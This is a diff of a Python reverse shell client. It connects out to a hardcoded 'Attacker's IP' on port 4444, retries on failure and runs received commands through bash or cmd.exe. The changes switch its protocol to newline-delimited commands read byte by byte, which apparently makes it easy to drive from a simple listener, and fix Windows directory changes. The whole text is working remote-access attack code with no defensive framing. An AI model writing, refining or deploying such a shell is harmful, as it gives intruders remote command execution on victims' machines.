@@ -8,8 +8,8 @@ import platform
 
 # Configuration
 HOST = '192.168.100.15'  # Attacker's IP
-PORT = 4444  # Attacker's port
-RECONNECT_DELAY = 5  # Seconds between connection attempts
+PORT = 4444               # Attacker's port
+RECONNECT_DELAY = 5       # Seconds between connection attempts
 BUFFER_SIZE = 1024 * 128  # 128KB buffer size
 ENCODING = 'utf-8'
 SHELL = '/bin/bash' if platform.system() != 'Windows' else 'cmd.exe'
@@ -43,7 +43,7 @@ class ReverseShell:
         """Main command session handler"""
         try:
             while self.running:
-                # Receive command with header
+                # Receive command
                 command = self.receive_data()
                 if not command:
                     break
@@ -113,35 +113,30 @@ class ReverseShell:
     def format_command(self, command):
         """Platform-specific command formatting"""
         if self.platform == 'Windows':
-            return f'cd "{self.current_dir}" && {command}'
+            return f'cd /D "{self.current_dir}" && {command}'
         return f'cd "{self.current_dir}"; {command}'
 
     def send_data(self, data):
-        """Reliable data transmission with length header"""
+        """Send data without header"""
         with self.lock:
             try:
-                encoded = data.encode(ENCODING)
-                header = len(encoded).to_bytes(4, 'big')
-                self.sock.sendall(header + encoded)
+                self.sock.sendall(data.encode(ENCODING))
             except Exception as e:
                 print(f"Send error: {str(e)}")
                 self.running = False
 
     def receive_data(self):
-        """Reliable data reception with length header"""
+        """Receive data until newline (for command parsing)"""
         try:
-            header = self.sock.recv(4)
-            if not header:
-                return None
-            length = int.from_bytes(header, 'big')
-            chunks = []
-            while length > 0:
-                chunk = self.sock.recv(min(length, BUFFER_SIZE))
+            data = b''
+            while True:
+                chunk = self.sock.recv(1)  # Read byte by byte
                 if not chunk:
+                    return None
+                if chunk == b'\n':
                     break
-                chunks.append(chunk)
-                length -= len(chunk)
-            return b''.join(chunks).decode(ENCODING)
+                data += chunk
+            return data.decode(ENCODING).strip()
         except Exception as e:
             print(f"Receive error: {str(e)}")
             return None
